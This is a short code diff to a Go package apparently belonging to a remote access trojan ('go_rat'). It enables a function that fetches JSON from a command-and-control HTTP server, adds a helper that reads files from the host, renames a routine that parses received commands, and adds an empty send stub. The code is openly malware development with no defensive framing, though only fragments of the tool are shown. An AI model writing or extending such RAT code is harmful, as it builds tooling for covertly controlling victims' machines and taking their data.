@@ -7,9 +7,13 @@ package Core
 
 import (
 	"encoding/json"
+	"go_rat/pkg/shared_code/ErrorHandling"
+	"io/ioutil"
+	"log"
+	"net/http"
 )
 
-/*/ this function is to extract JSON data from HTTP Server on C&C
+// this function is to extract JSON data from HTTP Server on C&C
 
 func HTTPRetriever(method string, http_addr string) []byte {
 	switch method {
@@ -29,14 +33,22 @@ func HTTPRetriever(method string, http_addr string) []byte {
 		//json.Unmarshal(body)
 	}
 }
+func FileToString(filename string) (string, error) {
+	filebuffer, derp := ioutil.ReadFile(filename)
+	if derp != nil {
+		ErrorHandling.RatLogError(derp, "[-] ERROR: Cannot Convert Data Object to String")
+	}
+	fileasstring := string(filebuffer)
+	return fileasstring, derp
+}
 
-/*/
+//
 
 // This function of for extracting messages sent in json into the
 // Command type
 // This gets placed in a loop to handle net.Conn type
 // containing json AFTER AUTH
-func Json_extract(text string) {
+func JsonReceive(text string) {
 	/*/
 		use Unmarshal if we expect our data to be pure JSON
 		second parameter is the address of the struct
@@ -45,4 +57,9 @@ func Json_extract(text string) {
 	// NewCommand contained in core.go
 	command_struct := NewCommand(text)
 	json.Unmarshal([]byte(text), &command_struct)
+}
+
+// function to
+func JsonSend() {
+
 }
